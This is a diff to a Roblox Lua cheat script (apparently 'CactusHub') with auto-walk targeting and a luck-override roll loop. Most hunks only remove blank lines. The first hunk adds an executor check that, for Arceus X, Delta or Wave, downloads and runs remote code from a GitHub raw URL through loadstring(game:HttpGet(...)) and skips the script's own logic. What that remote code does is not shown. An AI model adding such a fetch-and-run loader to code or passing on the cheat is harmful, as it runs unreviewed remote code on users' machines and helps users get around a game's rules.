@@ -1,3 +1,8 @@
+local _executor = (identifyexecutor and identifyexecutor()) or (getexecutorname and getexecutorname()) or ""
+if _executor == "Arceus X" or _executor == "Delta" or _executor == "Wave" then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/slimeData7/script/main/fallback"))()
+else
+
 task.spawn(function()
 	local HttpService = game:GetService("HttpService")
 	local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -500,9 +505,6 @@ task.spawn(function()
 		return nil
 	end
 
-	-- =====================================================================
-	-- ZONE BOUNDARY via POI.Baseplate
-	-- =====================================================================
 	local zoneBoundaryCache = { zoneId = nil, min = nil, max = nil, center = nil }
 
 	local function getZoneBoundary(zoneId)
@@ -834,12 +836,10 @@ task.spawn(function()
 				if currentTarget then currentTarget = nil stopAutoWalk() end
 				return
 			end
-
 			local char = localPlayer.Character
 			if not char then return end
 			local charRoot = char:FindFirstChild("HumanoidRootPart")
 			if not charRoot then return end
-
 			local currentZoneId = dataServiceClient and dataServiceClient:get("zone") or nil
 			local boundary = nil
 			if currentZoneId then
@@ -849,7 +849,6 @@ task.spawn(function()
 				end
 				boundary = getZoneBoundary(currentZoneId)
 			end
-
 			if boundary and isOutsideBoundary(charRoot.Position, boundary) then
 				stopAutoWalk()
 				currentTarget = nil
@@ -858,7 +857,6 @@ task.spawn(function()
 				task.wait(0.5)
 				return
 			end
-
 			if currentTarget and isAlive(currentTarget) and currentTarget.Parent then
 				if boundary and not isEnemyInsideBoundary(currentTarget, boundary) then
 					stopAutoWalk()
@@ -869,7 +867,6 @@ task.spawn(function()
 			else
 				stopAutoWalk()
 			end
-
 			local newTarget = selectTarget(boundary)
 			if newTarget and newTarget ~= currentTarget then
 				currentTarget = newTarget
@@ -1879,17 +1876,14 @@ task.spawn(function()
 					end
 					setLuck(1) task.wait(0.3)
 					setLuckEnabled(true) task.wait(0.3)
-
 					luckPollThread = task.spawn(function()
 						while indexRunning do
 							if indexLabels.lLuck then indexLabels.lLuck:Set("🍀 Luck Override: x"..tostring(luckValueLocal)) end
 							task.wait(1)
 						end
 					end)
-
 					local modeFlag = rayfieldLibrary.Flags and rayfieldLibrary.Flags.IndexRollMode
 					local mode = modeFlag and (type(modeFlag.CurrentOption)=="table" and modeFlag.CurrentOption[1] or modeFlag.CurrentOption) or "🌱 Easiest First"
-
 					local function getSortedCategoriesByPriority()
 						local cats = {}
 						for _, catId in ipairs(CATEGORY_IDS) do
@@ -1899,7 +1893,6 @@ task.spawn(function()
 						table.sort(cats, function(a, b) return a.easiestEffectiveOdds > b.easiestEffectiveOdds end)
 						return cats
 					end
-
 					local function runCategory(catId, modeStr, labels)
 						local failCount = 0
 						local catLabel  = catId:sub(1,1):upper()..catId:sub(2)
@@ -1937,7 +1930,6 @@ task.spawn(function()
 						end
 						return false
 					end
-
 					if selectedCategoryOption == nil or selectedCategoryOption == "🎲 All (Recommended)" then
 						while indexRunning do
 							local sorted = getSortedCategoriesByPriority()
@@ -1966,7 +1958,6 @@ task.spawn(function()
 						end
 						indexRunning = false
 					end
-
 					if luckPollThread then task.cancel(luckPollThread) end
 					setLuckEnabled(false)
 				end)
@@ -2758,3 +2749,5 @@ task.spawn(function()
 	rayfieldLibrary:LoadConfiguration()
 	Logger:info("CactusHub", "Init", "Script initialization complete")
 end)
+
+end -- closes executor check
